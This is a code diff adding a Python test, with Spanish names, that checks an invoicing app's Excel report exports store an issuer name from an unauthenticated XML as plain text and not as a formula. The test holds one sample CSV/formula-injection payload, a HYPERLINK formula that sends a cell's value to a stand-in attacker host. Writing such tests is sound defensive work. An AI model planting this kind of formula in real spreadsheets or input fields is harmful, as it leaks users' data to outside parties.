@@ -130,3 +130,21 @@ def test_d270_excluye_xml_y_usa_tipo_d151(client, auth, db_session):
     assert "XML sin respuesta de Hacienda" in resp and "Sin XML" in resp
     assert client.get("/reports/compras", params={"from": A, "to": B, "format": "xlsx"}).status_code == 200
     assert client.get("/reports/d151", params={"from": A, "to": B, "format": "xlsx"}).status_code == 200
+
+
+def test_excel_no_ejecuta_formulas_que_vienen_del_xml(client, auth):
+    """El nombre del emisor sale de un XML que llego por correo sin autenticar: en el Excel va como texto, nunca formula."""
+    from io import BytesIO
+
+    from openpyxl import load_workbook
+
+    malicioso = '=HYPERLINK("https://atacante.example/?"&C5,"Ver")'
+    d = recibir(client, 95, nombre=malicioso.replace("&", "&amp;"))
+    assert d["issuer_name"] == malicioso
+    responder(client, d["id"], create_expense=True)
+    for rep in ("compras", "recepciones", "gastos"):
+        x = client.get(f"/reports/{rep}", params={"from": A, "to": B, "format": "xlsx"})
+        assert x.status_code == 200, (rep, x.text)
+        ws = load_workbook(BytesIO(x.content)).active
+        celdas = [c for row in ws.iter_rows(min_row=5) for c in row if isinstance(c.value, str) and c.value.startswith("=")]
+        assert celdas and all(c.data_type == "s" and c.quotePrefix for c in celdas), rep
